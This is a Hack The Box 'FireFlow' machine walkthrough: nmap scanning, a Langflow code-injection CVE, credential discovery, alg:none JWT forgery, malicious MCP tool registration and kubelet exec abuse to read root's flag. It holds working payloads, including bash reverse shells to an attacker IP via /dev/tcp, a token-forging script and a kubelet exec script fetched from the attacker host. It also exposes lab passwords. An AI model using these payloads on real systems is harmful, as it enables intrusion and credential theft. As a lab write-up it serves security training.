# FireFlow HTB Medium Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.16.196
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 13:34 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Initiating Ping Scan at 13:34
Scanning 10.129.16.196 [4 ports]
Completed Ping Scan at 13:34, 0.91s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:34
Completed Parallel DNS resolution of 1 host. at 13:34, 0.50s elapsed
Initiating SYN Stealth Scan at 13:34
Scanning 10.129.16.196 [1000 ports]
Discovered open port 22/tcp on 10.129.16.196
Discovered open port 443/tcp on 10.129.16.196
Increasing send delay for 10.129.16.196 from 0 to 5 due to 83 out of 276 dropped probes since last increase.
Completed SYN Stealth Scan at 13:35, 16.97s elapsed (1000 total ports)
Initiating Service scan at 13:35
Scanning 2 services on 10.129.16.196
Completed Service scan at 13:35, 12.98s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.16.196.
Initiating NSE at 13:35
Completed NSE at 13:35, 12.25s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 2.30s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Nmap scan report for 10.129.16.196
Host is up (0.19s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open     ssl/http  nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://fireflow.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Issuer: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-14T16:35:31
| Not valid after:  2028-07-17T16:35:31
| MD5:     86f0 35a9 f228 e371 154d 9ace 12ca a7cb
| SHA-1:   11fd 8101 fae5 a1d1 8e5e 04c8 0fa0 6317 3b96 8cbf
|_SHA-256: 6613 a8e2 1925 1a51 99be 9878 59a1 3be2 a447 e5be 1444 5e25 49c0 9b6c cc04 9132
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.41 seconds
           Raw packets sent: 1299 (57.132KB) | Rcvd: 1129 (47.007KB)
```
## Web Emuneration
Visit `fireflow.htb` find this URL: `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25`, also find a mail: `ops@fireflow.htb`
In `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25`, found a AI Agent built with Langflow
## Web Exploiting
Searching found this [CVE-2026-33017](https://github.com/advisories/GHSA-vwmf-pq79-vjvx)
```bash
curl -sk -X POST \
  'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=<client_id_from_browser>' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Evil",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Evil",
          "type": "EvilComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.15.11/4444 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass EvilComp(Component):\n    display_name=\"Evil-X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "Evil-X",
            "base_classes": ["Data"],
            "display_name": "EvilComp",
            "name": "EvilComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"UNDEFINED","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    }
  }'
```
## Get user flag
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.16.196] 33872
bash: cannot set terminal process group (1531): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fireflow:/var/lib/langflow$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@fireflow:/var/lib/langflow$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 May 12 15:28 .
drwxr-xr-x 23 root      root      4096 May 12 15:28 ..
drwxr-x---  5 nightfall nightfall 4096 May 12 15:28 nightfall
www-data@fireflow:/var/lib/langflow$ ls -la /home/nightfall
ls -la /home/nightfall
ls: cannot open directory '/home/nightfall': Permission denied
www-data@fireflow:/var/lib/langflow$ pwd
pwd
/var/lib/langflow
www-data@fireflow:/var/lib/langflow$ ls
ls
ba4fe756-d6f7-4c7a-a7b1-f986206878ec
langflow.db
profile_pictures
secret_key
www-data@fireflow:/var/lib/langflow$ cat secret_key
cat secret_key
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
www-data@fireflow:/var/lib/langflow$ 
```
```bash
www-data@fireflow:/var/lib/langflow$ env
LANGFLOW_LOG_LEVEL=warning
USER_AGENT=langflow
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
LANGFLOW_NEW_USER_IS_ACTIVE=False
SERVER_SOFTWARE=gunicorn/22.0.0
PWD=/var/lib/langflow
LOGNAME=www-data
LANGFLOW_SUPERUSER=langflow
SYSTEMD_EXEC_PID=1531
LANGFLOW_CONFIG_DIR=/var/lib/langflow
HOME=/var/www
LANG=en_US.UTF-8
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
INVOCATION_ID=dec7524947a646b4a5c5351bac5d3462
USER=www-data
LANGFLOW_AUTO_LOGIN=False
SHLVL=3
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
JOURNAL_STREAM=8:12304
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
_=/usr/bin/env
```
Found `LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll`
```bash
nightfall@fireflow:~$ cat user.txt
1602f8a632f17ceb9f7400fb58797512
nightfall@fireflow:~$ 
```
## Lateral Movement
```bash
nightfall@fireflow:/tmp$ cat ~/.mcp/config.json
{
  "server": "http://10.129.16.196:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
nightfall@fireflow:/tmp$ curl -s http://10.129.16.196:30080/api/v1/auth \                                                                                                             
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}

```
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps` just has role user, we need admin
```bash
nightfall@fireflow:~$ echo
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.Ren
GdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f2 | base64 -d 2>/dev/null
{"sub":"langflow-bot","role":"user"}
```
Create JWT with role admin, alg: none:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/fireflow]
└─$ python3 ./craft.py 
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.

┌──(jameskaois㉿kali)-[~/Documents/hackthebox/fireflow]
└─$ cat craft.py                    
# craft.py
import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token = f"{header}.{payload}."
print(token)
```
```bash
nightfall@fireflow:~$ curl -X POST http://10.129.16.196:30080/api/v1/tools \                                                                                                                -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9." \
  -H "Content-Type: application/json" \
  -d '{                      
    "name": "exploitnotes",
    "description": "evil",
    "code": "import os; os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.15.11/4444 0>&1'\''\")"
  }'
{"status":"registered","name":"exploitnotes"}nightfall@fireflow:~$ 
nightfall@fireflow:~$ curl -s http://10.129.16.196:30080/mcp \                                                                                                                              -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9." \
  -H "Content-Type: application/json" \
  -d '{                   
    "jsonrpc": "2.0",                                                                            
    "id": 9,
    "method": "tools/call",
    "params": {"name": "exploitnotes", "arguments": {}}
  }'

```
## Privilege Escalation
```python
# kube_exec.py
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
NODE = "10.129.16.196"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{args}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
asyncio.run(ws_exec(COMMAND.split()))
```
## Get root flag
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.16.196] 40339
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
mcp@mcp-server-54464cb475-29ztf:/app$ id
id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp@mcp-server-54464cb475-29ztf:/app$ cd /tmp
cd /tmp
mcp@mcp-server-54464cb475-29ztf:/tmp$ which wget
which wget
mcp@mcp-server-54464cb475-29ztf:/tmp$ which curl
which curl
/usr/bin/curl
mcp@mcp-server-54464cb475-29ztf:/tmp$ curl http://10.10.15.11/kube_exec.py -o kube_exec.py
<url http://10.10.15.11/kube_exec.py -o kube_exec.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1255  100  1255    0     0   3245      0 --:--:-- --:--:-- --:--:--  3242
mcp@mcp-server-54464cb475-29ztf:/tmp$ which python
which python
/usr/local/bin/python
mcp@mcp-server-54464cb475-29ztf:/tmp$ which python3
which python3
/usr/local/bin/python3
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 ./kube_exec.py "cat /host/root/root/root.txt"
<thon3 ./kube_exec.py "cat /host/root/root/root.txt"
1e9389b66dc76d0995b8ff497e75138f
{"metadata":{},"status":"Success"}mcp@mcp-server-54464cb475-29ztf:/tmp$        
```